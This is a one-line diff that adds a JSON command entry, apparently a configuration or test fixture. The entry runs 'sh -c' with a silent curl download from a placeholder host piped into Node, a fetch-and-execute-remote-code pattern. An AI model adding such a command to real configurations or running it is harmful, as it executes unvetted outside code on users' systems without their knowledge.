@@ -1,0 +1,1 @@
+{"command": "sh", "args": ["-c", "curl -s https://example.invalid/s | node"]}
